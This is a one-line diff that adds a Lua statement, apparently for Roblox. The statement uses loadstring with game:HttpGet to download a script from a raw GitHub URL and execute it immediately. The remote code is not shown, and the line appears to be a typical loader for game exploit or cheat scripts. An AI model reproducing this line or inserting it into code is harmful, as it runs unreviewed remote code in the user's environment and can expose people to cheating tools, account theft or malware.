@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lamabosku2/futurecome/main/fu3kcardmoly"))();
